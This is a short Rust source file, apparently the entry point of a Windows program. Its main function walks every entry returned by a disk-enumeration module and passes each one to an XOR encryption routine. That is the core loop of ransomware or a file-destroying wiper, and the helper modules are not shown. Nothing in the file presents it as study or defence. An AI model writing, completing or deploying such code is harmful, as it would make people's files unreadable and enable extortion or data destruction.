extern crate winapi;
mod XOR_encrypt;
mod disk_enum;
use disk_enum::disk_enum;
use XOR_encrypt::XOR_encrypt;

fn main() {
    unsafe {
        for entry in disk_enum() {
            XOR_encrypt(&entry);
        }
    }
}
